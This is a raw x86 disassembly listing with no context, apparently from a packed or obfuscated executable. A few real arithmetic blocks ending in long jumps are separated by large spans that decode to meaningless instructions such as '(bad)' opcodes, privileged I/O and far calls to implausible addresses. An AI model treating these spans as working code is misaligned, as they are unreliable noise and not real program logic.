  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	(bad)  
  40c99e:	setle  BYTE PTR [eax+0x7e92ca00]
  40c9a5:	jle    0x40ca17
  40c9a7:	jns    0x40ca27
  40c9a9:	jle    0x40ca17
  40c9ab:	hlt    
  40c9ac:	jno    0x40c964
  40c9ae:	(bad)  [edx+0x5e]
  40c9b1:	cmp    ch,dl
  40c9b3:	popf   
  40c9b4:	push   eax
  40c9b5:	mov    bl,0x29
  40c9b7:	jmp    DWORD PTR [eax]
  40c9b9:	loopne 0x40c9ec
  40c9bb:	xor    al,0x41
  40c9bd:	mov    esi,0xfc5e988a
  40c9c2:	addr16 mov dl,0x56
  40c9c5:	addr16 mov eax,ds:0x46ab
  40c9c9:	arpl   WORD PTR [eax+0x64],ax
  40c9cc:	je     0x40c9fa
  40c9ce:	outs   dx,DWORD PTR ds:[esi]
  40c9d0:	(bad)  
  40c9d1:	adc    al,0x2b
  40c9d3:	cmc    
  40c9d4:	dec    esp
  40c9d5:	fbstp  TBYTE PTR ds:[ebx-0x7a]
  40c9d9:	adc    eax,eax
  40c9db:	add    al,bh
  40c9dd:	fimul  DWORD PTR ds:0x7c22cf29
  40c9e3:	out    dx,al
  40c9e4:	sub    ch,dh
  40c9e6:	adc    al,0xf6
  40c9e8:	in     al,dx
  40c9e9:	cmp    al,0x13
  40c9eb:	xlat   BYTE PTR ds:[ebx]
  40c9ec:	lahf   
  40c9ed:	outs   dx,DWORD PTR ds:[esi]
  40c9ee:	imul   edi,DWORD PTR [edx+eiz*1-0x15],0xb94507b3
  40c9f6:	out    0x1d,eax
  40c9f8:	test   eax,0xdf6aa9d8
  40c9fd:	(bad)  
  40c9fe:	cmc    
  40c9ff:	pop    ss
  40ca00:	mov    al,0xdc
  40ca02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca03:	dec    edx
  40ca04:	cld    
  40ca05:	adc    ecx,esp
  40ca07:	sar    DWORD PTR ds:0x999aa071,1
  40ca0d:	int3   
  40ca0e:	cmp    eax,0x3b2be2a0
  40ca13:	push   esp
  40ca14:	imul   ebp,ebx,0x5c578f0e
  40ca1a:	or     BYTE PTR [esi+esi*1],cl
  40ca1d:	sbb    DWORD PTR ds:0x61ee,edx
  40ca22:	iret   
  40ca23:	fld    TBYTE PTR [eax+0x5b244281]
  40ca29:	or     DWORD PTR [ebx+edx*2],0xffffffea
  40ca2d:	mov    bl,0xc5
  40ca2f:	push   cs
  40ca30:	push   ebp
  40ca31:	dec    ebx
  40ca32:	hlt    
  40ca33:	mov    ebp,0xeba1c7e5
  40ca38:	inc    ebp
  40ca39:	iret   
  40ca3a:	add    al,0x7a
  40ca3c:	(bad)  
  40ca3d:	push   edx
  40ca3e:	xchg   edx,eax
  40ca3f:	mov    dl,0xca
  40ca41:	mov    cl,0x59
  40ca43:	sbb    DWORD PTR [esi],ecx
  40ca45:	(bad)  
  40ca47:	adc    al,0x7a
  40ca49:	xor    BYTE PTR [ebx],0xf6
  40ca4c:	mov    cl,0x26
  40ca4e:	mov    esp,0xaacdb16a
  40ca53:	adc    al,0x65
  40ca55:	mov    esp,0x7e84b672
  40ca5a:	pop    esp
  40ca5b:	add    eax,ebx
  40ca5d:	mov    cl,0x92
  40ca5f:	inc    eax
  40ca60:	sub    ecx,DWORD PTR [eax]
  40ca62:	cmp    dh,al
  40ca64:	retf   0xa29e
  40ca67:	push   ds
  40ca68:	add    BYTE PTR [edx+eiz*1+0x7d],0xa9
  40ca6d:	in     eax,0x4e
  40ca6f:	jmp    0x40ca7b
  40ca71:	mov    dh,0x5
  40ca73:	ins    BYTE PTR es:[edi],dx
  40ca74:	ds push 0x24fd52e6
  40ca7a:	jae    0x40caad
  40ca7c:	jae    0x40ca93
  40ca7e:	in     eax,dx
  40ca7f:	add    BYTE PTR ds:0x3e2fa5e1,ch
  40ca85:	inc    ebp
  40ca86:	pop    edi
  40ca87:	mov    edx,0x9a4ed6b9
  40ca8c:	jp     0x40cb06
  40ca8e:	test   BYTE PTR [ecx-0x5e],al
  40ca91:	or     eax,0x1b4cade1
  40ca96:	sahf   
  40ca97:	mov    cl,0xc3
  40ca99:	fist   DWORD PTR [edi]
  40ca9b:	das    
  40ca9c:	movhps QWORD PTR [ebp-0x6b52cbea],xmm1
  40caa3:	lea    esp,[ecx+0x474baa27]
  40caa9:	repnz dec ecx
  40caab:	xchg   esi,eax
  40caac:	pop    edx
  40caad:	pop    ds
  40caae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caaf:	add    ebx,0x6b
  40cab2:	push   ebp
  40cab3:	pop    edx
  40cab4:	sti    
  40cab5:	mov    dl,0x82
  40cab7:	(bad)  [esi+ecx*1]
  40caba:	lods   al,BYTE PTR ds:[esi]
  40cabb:	cmp    al,dl
  40cabd:	cwde   
  40cabe:	inc    esp
  40cabf:	mov    BYTE PTR [edi+0x6f4b5e46],dl
  40cac5:	xchg   edi,eax
  40cac6:	add    al,0x78
  40cac8:	sub    eax,0x8f01c6dc
  40cacd:	fs es clc 
  40cad0:	jp     0x40caa4
  40cad2:	dec    edx
  40cad3:	add    DWORD PTR [edx-0x8],edx
  40cad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad7:	push   edx
  40cad8:	ror    BYTE PTR [edx],0x50
  40cadb:	xor    al,0x6
  40cadd:	inc    ebp
  40cade:	push   0x5d
  40cae0:	pop    ebx
  40cae1:	xor    al,BYTE PTR [ebx-0x10f7e15c]
  40cae7:	inc    esi
  40cae8:	stos   DWORD PTR es:[edi],eax
  40cae9:	mov    dh,0xc9
  40caeb:	jb     0x40cab1
  40caed:	out    0xbc,eax
  40caef:	ret    0x60cf
  40caf2:	push   0x950237dd
  40caf7:	mov    ecx,0xd5b5f987
  40cafc:	xchg   ebp,eax
  40cafd:	ror    BYTE PTR [ecx],cl
  40caff:	mov    al,0x70
  40cb01:	mov    edx,0x4b277898
  40cb06:	cs ret 
  40cb08:	fdivr  DWORD PTR [edi-0x7c]
  40cb0b:	scas   eax,DWORD PTR es:[edi]
  40cb0c:	sbb    esp,esi
  40cb0e:	sbb    BYTE PTR [edx+0x3a988373],cl
  40cb14:	jbe    0x40cb1f
  40cb16:	je     0x40cae3
  40cb18:	cwde   
  40cb19:	cld    
  40cb1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb1c:	xchg   ecx,eax
  40cb1d:	cmp    bl,BYTE PTR [eax]
  40cb1f:	repz adc al,0x10
  40cb22:	inc    esi
  40cb23:	jmp    0xfd82b4d3
  40cb28:	jno    0x40cb7e
  40cb2a:	int    0xba
  40cb2c:	pop    ebp
  40cb2d:	emms   
  40cb2f:	mov    ecx,0x1e759c66
  40cb34:	lea    esp,[esi]
  40cb36:	mov    al,ds:0x9f885ba0
  40cb3b:	push   0x7
  40cb3d:	aas    
  40cb3e:	mov    esi,0x70204782
  40cb43:	pusha  
  40cb44:	hlt    
  40cb45:	mov    al,ds:0xda5027fb
  40cb4a:	mov    ds:0x7276499d,al
  40cb4f:	es or  eax,0xd73346fa
  40cb55:	iret   
  40cb56:	scas   eax,DWORD PTR es:[edi]
  40cb57:	or     eax,0x2ee136d4
  40cb5c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40cb5e:	or     BYTE PTR [ecx+edx*8-0x7d828986],cl
  40cb65:	out    0x14,al
  40cb67:	inc    ebx
  40cb68:	imul   ebx,eax,0xfffffffd
  40cb6b:	in     al,0x3
  40cb6d:	int    0x2f
  40cb6f:	lock jmp 0x4c0bfaa6
  40cb75:	stc    
  40cb76:	cmp    eax,0x78d816e5
  40cb7b:	mov    dh,0x6a
  40cb7d:	xchg   DWORD PTR [edx-0x5271b198],esi
  40cb83:	push   ds
  40cb84:	jp     0x40cb67
  40cb86:	mov    edx,0xb6e579fe
  40cb8b:	xchg   ecx,eax
  40cb8c:	xor    DWORD PTR [esi+eiz*2],edi
  40cb8f:	dec    eax
  40cb90:	daa    
  40cb91:	stc    
  40cb92:	push   edx
  40cb93:	sub    DWORD PTR [ebp-0x3f],eax
  40cb96:	fnstcw WORD PTR [ebp+edi*4-0x7daec84]
  40cb9d:	pop    ebp
  40cb9e:	daa    
  40cb9f:	xchg   edi,eax
  40cba0:	dec    ebp
  40cba1:	nop    esp
  40cba4:	out    dx,eax
  40cba5:	add    ah,bh
  40cba7:	or     eax,DWORD PTR [ecx]
  40cba9:	mov    ebx,DWORD PTR ds:0xc7a8c273
  40cbaf:	mov    ds,ebx
  40cbb1:	mov    edx,0x7249fd3d
  40cbb6:	dec    esp
  40cbb7:	jb     0x40cbf7
  40cbb9:	ror    si,0x31
  40cbbd:	pop    edx
  40cbbe:	pop    ecx
  40cbbf:	xor    BYTE PTR [edi+edx*1],cl
  40cbc2:	lds    ebx,FWORD PTR [edx]
  40cbc4:	nop
  40cbc5:	fcmovbe st,st(5)
  40cbc7:	cmp    BYTE PTR [ebp+0x33],0xc9
  40cbcb:	sbb    BYTE PTR [edi-0x48be08ac],bl
  40cbd1:	lock jno 0x40cc4a
  40cbd4:	push   eax
  40cbd5:	loope  0x40cb8b
  40cbd7:	sbb    eax,esi
  40cbd9:	dec    edx
  40cbda:	es mov esi,0xec2e26c6
  40cbe0:	std    
  40cbe1:	ss inc esi
  40cbe3:	mov    dh,0x9
  40cbe5:	retf   0xf738
  40cbe8:	jbe    0x40cbd8
  40cbea:	adc    BYTE PTR [esi+0x7d970931],0xb4
  40cbf1:	retf   0xb514
  40cbf4:	add    al,0x26
  40cbf6:	jecxz  0x40cb96
  40cbf8:	ret    0xfcda
  40cbfb:	sbb    BYTE PTR [eax+0x30],al
  40cbfe:	mov    bl,bl
  40cc00:	repnz data16 adc al,0x7d
  40cc04:	jg     0x40cbcc
  40cc06:	jbe    0x40cc65
  40cc08:	push   ds
  40cc09:	or     eax,0x53af68ab
  40cc0e:	sar    DWORD PTR [ecx],0xe
  40cc11:	sub    eax,0x9cfdd55b
  40cc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc17:	and    al,0x6c
  40cc19:	jmp    0xbdb7dae8
  40cc1e:	inc    edx
  40cc1f:	sub    BYTE PTR [ecx],0x5d
  40cc22:	loop   0x40cc88
  40cc24:	(bad)  
  40cc25:	push   ebx
  40cc26:	bound  ebp,QWORD PTR [ebp+0x582c4c5d]
  40cc2c:	or     eax,0x21b705bd
  40cc31:	pop    ecx
  40cc32:	or     DWORD PTR [ebp+0x5c],eax
  40cc35:	int    0xab
  40cc37:	ja     0x40cc1c
  40cc39:	stc    
  40cc3a:	iret   
  40cc3b:	sbb    ch,BYTE PTR [ebp-0x757f9be6]
  40cc41:	daa    
  40cc42:	mov    al,BYTE PTR [edx+0x26]
  40cc45:	cs iret 
  40cc47:	mov    al,0x58
  40cc49:	cmp    edi,ebx
  40cc4b:	pop    esi
  40cc4c:	xor    edi,esi
  40cc4e:	pop    esp
  40cc4f:	in     eax,dx
  40cc50:	inc    eax
  40cc51:	mov    bh,0xdc
  40cc53:	mov    gs,WORD PTR [ebx+0x1c]
  40cc56:	sub    dl,0x92
  40cc59:	mov    eax,0xa5041177
  40cc5e:	push   ds
  40cc5f:	mov    bl,0x51
  40cc61:	dec    edx
  40cc62:	mov    dl,0x23
  40cc64:	outs   dx,BYTE PTR ds:[esi]
  40cc65:	xor    ecx,ecx
  40cc67:	loope  0x40cccf
  40cc69:	test   al,0xcb
  40cc6b:	mov    bh,0xa7
  40cc6e:	shl    DWORD PTR [eax+ecx*8-0x24e03675],0x5
  40cc76:	mov    ds:0x79830752,eax
  40cc7b:	(bad)  
  40cc7d:	cmp    BYTE PTR [edi-0x13],bl
  40cc80:	sar    DWORD PTR [edx+0x81eccf7],0xfb
  40cc87:	cmp    esi,DWORD PTR [ebx+ecx*8]
  40cc8a:	xor    edx,ecx
  40cc8c:	fldcw  WORD PTR [esi-0x978ca98]
  40cc92:	or     eax,0x99899756
  40cc97:	jg     0x40cc4a
  40cc99:	call   0x8516d459
  40cc9e:	sbb    BYTE PTR [ecx-0x6d86615f],dh
  40cca4:	push   es
  40cca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca6:	sahf   
  40cca7:	(bad)  
  40cca8:	sub    al,0x24
  40ccaa:	inc    eax
  40ccab:	fadd   QWORD PTR [ebp-0x2c]
  40ccae:	loop   0x40cd00
  40ccb0:	or     eax,0x1ce9c584
  40ccb5:	push   eax
  40ccb6:	call   0xd10e:0xe178ebdf
  40ccbd:	fmul   st,st(7)
  40ccbf:	mov    cl,BYTE PTR [ebx-0x26]
  40ccc2:	xor    eax,DWORD PTR [ecx]
  40ccc4:	xchg   edx,eax
  40ccc5:	mov    edi,0x14b32f43
  40ccca:	mov    bl,BYTE PTR [ebx-0x443e630b]
  40ccd0:	push   ecx
  40ccd1:	(bad)  
  40ccd2:	add    eax,0x3459d6c1
  40ccd7:	mov    bh,0x98
  40ccd9:	outs   dx,BYTE PTR ds:[esi]
  40ccda:	mov    eax,0xaca111f3
  40ccdf:	ins    BYTE PTR es:[edi],dx
  40cce0:	jle    0x40cd21
  40cce2:	dec    edi
  40cce3:	mov    esp,0x54dff06f
  40cce8:	adc    BYTE PTR [edi+ebp*8+0x6ef5cf51],ah
  40ccef:	pushf  
  40ccf0:	rcl    DWORD PTR [ecx],0xba
  40ccf3:	int    0x3
  40ccf5:	hlt    
  40ccf6:	jge    0x40cce0
  40ccf8:	cs sbb eax,0xa5a152cf
  40ccfe:	push   0xa92194bb
  40cd03:	and    al,0x9b
  40cd05:	mov    bh,0x39
  40cd07:	aam    0xdf
  40cd09:	mov    esi,0x37498c6b
  40cd0e:	dec    edx
  40cd0f:	jp     0x40ccf3
  40cd11:	adc    bh,BYTE PTR [eax]
  40cd13:	fidiv  WORD PTR [eax]
  40cd15:	mov    dl,0x6d
  40cd17:	stos   BYTE PTR es:[edi],al
  40cd18:	or     al,0x1e
  40cd1a:	js     0x40cd2c
  40cd1c:	in     al,0x19
  40cd1e:	add    al,dl
  40cd20:	inc    ebx
  40cd21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd22:	adc    BYTE PTR [esi-0x21],al
  40cd25:	mov    ecx,0xc2b496cd
  40cd2a:	or     edi,DWORD PTR [ebp+0x126da4a9]
  40cd30:	push   ss
  40cd31:	or     al,0x9
  40cd33:	add    dh,al
  40cd35:	xchg   ebp,eax
  40cd36:	sbb    al,0xc1
  40cd38:	cli    
  40cd39:	stos   BYTE PTR es:[edi],al
  40cd3a:	xor    ecx,DWORD PTR [ecx-0x22974e5c]
  40cd40:	or     eax,0x62fc2866
  40cd45:	rol    BYTE PTR [esi+0x13],1
  40cd48:	dec    esp
  40cd49:	enter  0x935c,0x4d
  40cd4d:	das    
  40cd4e:	add    eax,0xaa86a030
  40cd53:	loop   0x40cdbf
  40cd55:	jno    0x40cd60
  40cd57:	push   ecx
  40cd58:	sbb    al,0xd
  40cd5a:	adc    ebx,ebx
  40cd5c:	push   cs
  40cd5d:	in     eax,dx
  40cd5e:	push   ds
  40cd5f:	mov    bh,0x46
  40cd61:	lahf   
  40cd62:	push   es
  40cd63:	push   esi
  40cd64:	dec    ebp
  40cd65:	aad    0xbd
  40cd67:	pop    eax
  40cd68:	sub    ebp,DWORD PTR [ebx+0x56]
  40cd6b:	xor    al,0x75
  40cd6d:	xchg   edi,eax
  40cd6e:	adc    edx,DWORD PTR [ecx-0x507e3686]
  40cd74:	scas   al,BYTE PTR es:[edi]
  40cd75:	mov    ecx,DWORD PTR [eax-0x7f]
  40cd78:	jnp    0x40cd16
  40cd7a:	cmp    eax,0x6ab554a3
  40cd7f:	jmp    0xab6c:0xcbae152e
  40cd86:	lea    esi,[ebx+ebx*4+0x7c]
  40cd8a:	pop    esi
  40cd8b:	sub    DWORD PTR [edx+0x21],ecx
  40cd8e:	popa   
  40cd8f:	cmp    cl,BYTE PTR [ebx-0x4c]
  40cd92:	add    DWORD PTR [edx+0x31],0xb2dade47
  40cd99:	xchg   BYTE PTR [eax],al
  40cd9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd9c:	ficom  DWORD PTR [eax+0x78de683a]
  40cda2:	call   0x1fd555dd
  40cda7:	cdq    
  40cda8:	jb     0x40cddc
  40cdaa:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40cdb0:	hlt    
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	push   ds
  40cdda:	cs out 0x79,eax
  40cddd:	int3   
  40cdde:	sahf   
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	or     DWORD PTR [edx-0x43],eax
  40cde8:	dec    ebp
  40cde9:	stc    
  40cdea:	push   cs
  40cdeb:	test   eax,0xd319dcc1
  40cdf0:	inc    eax
  40cdf1:	sub    cl,BYTE PTR [edi-0x7e]
  40cdf4:	jae    0x40cd9a
  40cdf6:	push   esp
  40cdf7:	xor    eax,0xc07653b7
  40cdfc:	fs sub eax,0x5b3cc053
  40ce02:	xor    esp,DWORD PTR ds:0x369bf931
  40ce08:	not    BYTE PTR [edx]
  40ce0a:	adc    BYTE PTR [esi+0x5ff42712],dl
  40ce10:	pop    esi
  40ce11:	and    eax,DWORD PTR [eax-0x4bf7a51d]
  40ce17:	je     0x40ce74
  40ce19:	cdq    
  40ce1a:	loop   0x40ce17
  40ce1c:	sbb    esi,ecx
  40ce1e:	xchg   DWORD PTR [esi+0x1a],edi
  40ce21:	pop    esp
  40ce22:	jnp    0x40cdf6
  40ce24:	mov    edi,DWORD PTR [ecx+ebp*8-0x58]
  40ce28:	js     0x40ce29
  40ce2a:	retf   0x19e3
  40ce2d:	dec    edi
  40ce2e:	hlt    
  40ce2f:	jne    0x40cdde
  40ce31:	inc    ecx
  40ce32:	push   0xfffffffc
  40ce34:	sub    eax,0xcd217743
  40ce39:	mov    cs,WORD PTR [edx-0x1a]
  40ce3c:	mov    al,ds:0x3e2f0a70
  40ce41:	cld    
  40ce42:	outs   dx,DWORD PTR ds:[esi]
  40ce43:	and    al,0x66
  40ce45:	ja     0x40ce06
  40ce47:	dec    eax
  40ce48:	fdiv   DWORD PTR [ebp-0x44]
  40ce4b:	mov    dh,0xf4
  40ce4d:	call   0xa04d:0x3079b3c7
  40ce54:	aas    
  40ce55:	js     0x40ce18
  40ce57:	mov    bl,0xa8
  40ce59:	fmul   QWORD PTR ds:0x8caecb4c
  40ce5f:	into   
  40ce60:	dec    edi
  40ce61:	adc    DWORD PTR [edi-0x3b641fba],0x59
  40ce68:	mov    esp,0x8698c4f9
  40ce6d:	loop   0x40ce28
  40ce6f:	push   ss
  40ce70:	stos   DWORD PTR es:[edi],eax
  40ce71:	pop    edi
  40ce72:	test   dl,ah
  40ce74:	sub    al,0xe6
  40ce76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce77:	pop    edi
  40ce78:	ja     0x40ce40
  40ce7a:	xor    DWORD PTR [edi+eax*8],eax
  40ce7d:	jbe    0x40cef4
  40ce7f:	mov    cl,0x94
  40ce81:	lods   al,BYTE PTR ds:[esi]
  40ce82:	int3   
  40ce83:	or     bh,BYTE PTR [ecx-0x6a]
  40ce86:	mov    ds:0xe1a62594,eax
  40ce8b:	mov    dl,0x60
  40ce8d:	lods   al,BYTE PTR ds:[esi]
  40ce8e:	call   0xae343bb5
  40ce93:	fmul   st,st(1)
  40ce95:	mov    ds:0x155f49e3,al
  40ce9a:	jne    0x40cee7
  40ce9c:	add    ecx,DWORD PTR [ecx+0x21dd5539]
  40cea2:	adc    ch,al
  40cea4:	in     eax,dx
  40cea5:	ins    BYTE PTR es:[edi],dx
  40cea6:	push   ebx
  40cea7:	ja     0x40cf04
  40cea9:	aas    
  40ceaa:	(bad)  
  40ceab:	test   BYTE PTR [ebx+0x2b18e15d],cl
  40ceb1:	jbe    0x40cf15
  40ceb3:	test   DWORD PTR [edi-0x19],esi
  40ceb6:	les    edx,FWORD PTR [ebx]
  40ceb8:	mov    cl,0x8b
  40ceba:	in     eax,0x63
  40cebc:	push   ss
  40cebd:	pushf  
  40cebe:	xchg   edx,eax
  40cebf:	ja     0x40ce64
  40cec1:	pusha  
  40cec2:	adc    al,BYTE PTR [edi-0x4a]
  40cec5:	aas    
  40cec6:	aaa    
  40cec7:	fstp   DWORD PTR [edx+ecx*1-0x46]
  40cecb:	mov    BYTE PTR [esi+eax*1-0x10],0xc3
  40ced0:	xchg   ebp,eax
  40ced1:	dec    esi
  40ced2:	nop
  40ced3:	sar    DWORD PTR [esi+0x3124f890],0x42
  40ceda:	adc    DWORD PTR [edi],ebx
  40cedc:	add    eax,0xf8c9e353
  40cee1:	das    
  40cee2:	mov    esp,0x6191804c
  40cee7:	not    DWORD PTR [ecx-0x48b2383f]
  40ceed:	jne    0x40cebf
  40ceef:	xor    edx,edi
  40cef1:	outs   dx,BYTE PTR ds:[esi]
  40cef2:	push   esp
  40cef3:	push   cs
  40cef4:	jbe    0x40cf26
  40cef6:	push   0x14
  40cef8:	arpl   WORD PTR [eax-0x28f34e21],si
  40cefe:	iret   
  40ceff:	fdiv   st(0),st
  40cf01:	dec    edx
  40cf02:	jnp    0x40cf51
  40cf04:	in     al,0x51
  40cf06:	dec    esp
  40cf07:	pushf  
  40cf08:	(bad)  
  40cf09:	or     DWORD PTR gs:[edx+ebx*2+0x2b],0xfffffffc
  40cf0f:	xchg   edi,eax
  40cf10:	and    dh,BYTE PTR [eax-0x6]
  40cf13:	jmp    0x9eff0910
  40cf18:	xchg   esi,eax
  40cf19:	fdiv   QWORD PTR [ebp+0x17ea5b9a]
  40cf1f:	push   ecx
  40cf20:	push   eax
  40cf21:	jmp    0x80e78f51
  40cf26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf27:	mov    ebx,esp
  40cf29:	inc    esp
  40cf2a:	xchg   edi,eax
  40cf2b:	jbe    0x40cef6
  40cf2d:	jecxz  0x40cec9
  40cf2f:	test   BYTE PTR [ebx-0x6f],cl
  40cf32:	test   DWORD PTR [ecx],edx
  40cf34:	mov    fs,WORD PTR [ecx-0x43]
  40cf37:	lods   al,BYTE PTR ds:[esi]
  40cf38:	dec    ebp
  40cf39:	pop    ss
  40cf3a:	loope  0x40cf63
  40cf3c:	pop    esi
  40cf3d:	stc    
  40cf3e:	pop    esp
  40cf3f:	push   0xf0bd629e
  40cf44:	cmp    DWORD PTR [esp+esi*1+0x7569e9a8],edi
  40cf4b:	test   DWORD PTR [edx+0x79],edi
  40cf4e:	aas    
  40cf4f:	xchg   ecx,eax
  40cf50:	pcmpgtw mm0,QWORD PTR [edx]
  40cf53:	retf   0xad42
  40cf56:	fist   WORD PTR [ebp+0x29]
  40cf59:	push   ecx
  40cf5a:	add    al,0x44
  40cf5c:	fcmovnbe st,st(0)
  40cf5e:	mov    ds:0x209015b,eax
  40cf63:	sub    esi,DWORD PTR [ebx+0xe]
  40cf66:	adc    dl,BYTE PTR [edi-0x1c3bae3]
  40cf6c:	ss jb  0x40cf01
  40cf6f:	aam    0x10
  40cf71:	sub    al,BYTE PTR [ebx+0x53455026]
  40cf77:	jbe    0x40cf1c
  40cf79:	ret    
  40cf7a:	out    0xab,eax
  40cf7c:	stc    
  40cf7d:	sub    DWORD PTR [ebp-0x1dde0686],esp
  40cf83:	fdivrp st(3),st
  40cf85:	mov    DWORD PTR [ebx+edx*8-0x51],0xd18032c7
  40cf8d:	hlt    
  40cf8e:	popa   
  40cf8f:	ficom  WORD PTR [esi+eiz*1-0x59ed4ef7]
  40cf96:	and    al,BYTE PTR [edx-0x585fbd9f]
  40cf9c:	jmp    0xba03:0x38fb6ff3
  40cfa3:	frstor [edx]
  40cfa5:	cmp    DWORD PTR [eax+0x5e],eax
  40cfa8:	in     eax,dx
  40cfa9:	and    BYTE PTR [edi-0x371b16ca],ah
  40cfaf:	mov    esi,0x5fe704c
  40cfb4:	add    ah,al
  40cfb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfb7:	imul   ecx,edi,0xac25a042
  40cfbd:	cmp    al,0xa4
  40cfbf:	add    eax,0xde7101d6
  40cfc4:	sub    edi,DWORD PTR [ecx-0x6e0d3498]
  40cfca:	xchg   ebx,eax
  40cfcb:	std    
  40cfcc:	fisub  DWORD PTR [ebx+0x7d7ddfb6]
  40cfd2:	in     eax,dx
  40cfd3:	jnp    0x40d030
  40cfd5:	rep outs dx,DWORD PTR ds:[esi]
  40cfd7:	mov    ds,WORD PTR [edx-0x6e]
  40cfda:	jmp    0x40cfcf
  40cfdc:	xchg   edi,eax
  40cfdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfde:	add    eax,0xfc32970a
  40cfe3:	dec    ebx
  40cfe4:	pop    edx
  40cfe5:	xchg   ecx,eax
  40cfe6:	retf   
  40cfe7:	inc    ebx
  40cfe8:	or     edi,DWORD PTR [edx+0x61b4df80]
  40cfee:	cli    
  40cfef:	iret   
  40cff0:	int    0x8f
  40cff2:	adc    eax,0xda474504
  40cff7:	adc    al,0x4f
  40cff9:	rcl    DWORD PTR [ecx],1
  40cffb:	xchg   BYTE PTR ds:0xffaf7921,dl
  40d001:	xchg   DWORD PTR [ecx+0x6d],esi
  40d004:	dec    ebp
  40d005:	retf   
  40d006:	(bad)  
  40d007:	xlat   BYTE PTR ds:[ebx]
  40d008:	adc    edx,eax
  40d00a:	xchg   BYTE PTR [ebx-0x42906b3d],al
  40d010:	xor    BYTE PTR [ecx+0x7a],ah
  40d013:	push   esp
  40d014:	lds    eax,FWORD PTR [edi-0x4705509b]
  40d01a:	test   eax,0x2ea3c58f
  40d01f:	push   0x1782d02f
  40d024:	pushf  
  40d025:	jge    0x40cfc0
  40d027:	mov    bl,0xee
  40d029:	mov    ecx,0x7d3d71a2
  40d02e:	dec    eax
  40d02f:	js     0x40d09f
  40d031:	push   0xfbe60970
  40d036:	jle    0x40d00e
  40d038:	scas   al,BYTE PTR es:[edi]
  40d039:	ror    BYTE PTR [ebx-0x45ff3a05],1
  40d03f:	cwde   
  40d040:	dec    ecx
  40d041:	nop
  40d042:	fcomi  st,st(0)
  40d044:	xchg   edi,eax
  40d045:	jg     0x40d0c3
  40d047:	rol    BYTE PTR [ecx+0x7e],0x22
  40d04b:	jo     0x40d010
  40d04d:	mov    bh,0x82
  40d050:	xchg   edx,eax
  40d051:	ins    DWORD PTR es:[edi],dx
  40d052:	add    eax,0xa0863cd1
  40d057:	inc    edx
  40d058:	std    
  40d059:	in     eax,dx
  40d05a:	cmp    ebp,eax
  40d05c:	jmp    0x2e02:0x90c5e6a1
  40d063:	out    dx,al
  40d064:	cmp    BYTE PTR [esi+0x57e342c0],ch
  40d06a:	test   eax,0x9a362187
  40d06f:	pop    ebx
  40d070:	mov    bl,0x77
  40d072:	pushf  
  40d073:	out    dx,eax
  40d074:	int    0x83
  40d076:	ss dec esi
  40d078:	fstenv ds:0xf7e38372
  40d07f:	xlat   BYTE PTR ds:[bx]
  40d081:	fsubr  st(5),st
  40d083:	jl     0x40d033
  40d085:	inc    ebp
  40d086:	dec    edi
  40d087:	scas   al,BYTE PTR es:[edi]
  40d088:	sbb    al,0xcb
  40d08a:	push   cs
  40d08b:	mov    ebx,0xe7c68bbf
  40d090:	pop    esi
  40d091:	xor    ebp,DWORD PTR [ebx+0x56b3ffde]
  40d097:	fsubp  st(3),st
  40d099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d09a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d09b:	sub    edi,DWORD PTR [edx]
  40d09d:	mov    esi,esi
  40d09f:	fisubr DWORD PTR [ebx+0x4e94cfc2]
  40d0a5:	xchg   ebx,eax
  40d0a6:	je     0x40d0b7
  40d0a8:	cmp    bl,BYTE PTR [edx+0x3d]
  40d0ab:	or     BYTE PTR ds:0x61f9103e,0x23
  40d0b2:	pop    es
  40d0b3:	test   BYTE PTR [edx+0x4bb46a35],0xed
  40d0ba:	sub    al,BYTE PTR [ebx-0x24]
  40d0bd:	mov    WORD PTR [edi-0x6996aaa8],?
  40d0c3:	mov    al,ds:0x7c1ba3ac
  40d0c8:	or     ah,al
  40d0ca:	mov    esp,0xc6d483a7
  40d0cf:	ror    BYTE PTR [ebp-0xa],cl
  40d0d2:	lahf   
  40d0d3:	mov    edx,0x2627c2eb
  40d0d8:	shr    BYTE PTR [ecx],1
